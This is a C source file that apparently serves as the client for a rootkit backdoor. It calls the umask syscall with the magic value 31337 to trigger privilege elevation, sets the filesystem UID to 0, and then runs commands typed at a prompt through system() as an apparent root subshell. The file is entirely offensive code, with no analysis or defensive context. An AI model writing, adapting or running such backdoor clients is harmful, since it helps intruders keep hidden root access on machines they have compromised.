#define _GNU_SOURCE
#include <stdlib.h>
#include <stdio.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <unistd.h>
#include <string.h>
#include <sys/fsuid.h>

#define __NR_umask 95
#define BUFSIZE 512

void trim(char []);
char *format_cmd(char []);

/**
 * Elevates this processes priviledges then spawns a subshell.
 **/
int main(int argc, char **argv){
    syscall(__NR_umask, 31337);
    setfsuid(0);
    
    // Collect and execute bash commands with PID equal to this process
    while (1){
        printf("Sub shell: ");
        char cmd[BUFSIZE] = {'\0'};
        fgets(cmd, BUFSIZE, stdin);
        trim(cmd);
        if (strncmp(cmd, "exit", strlen(cmd)) == 0){
            printf("Ending sub session . . . \n");
            exit(0);
        }
        // format cmd => add braces so it runs in a sub shell
        char *str = format_cmd(cmd);
        system(str); free(str);
    }

    return 0;
} 

/**
 * Trims whitespace from the end of str and any newline" **/
void trim(char str[]){
    int len = strlen(str);
    int i = 0;
    // delete new line.
    while(i < len && str[i] != '\n') i++;
    if (i != len) str[i] = '\0';
    len = strlen(str);
    i = len - 1;
    while(i < len && i > 0){
        if (str[i] == ' '){
            str[i] = '\0';
        } else break;
        i--;
    } return;
}

/** Adds a leading "( " and " )" string to
 * the start and before '\0' of str while
 * also deleting first newline. **/
char *format_cmd(char str[]){
    
    int len = strlen(str);
    int i = 0;
    char *new = malloc(sizeof(char) * (BUFSIZE+4));
    // delete new line.
    while(i < len && str[i] != '\n') i++;
    if (i != len) str[i] = '\0';
    len = strlen(str);
    new[0] = '(';
    new[1] = ' ';
    new[len+2] = ' ';
    new[len+3] = ')';
    new[len+4] = '\0';
    i = 0;
    while(i < len){
        if (str[i] == '\n'){
            i++;
        }
        new[i+2] = str[i];
        i++;
    }
    return new;
}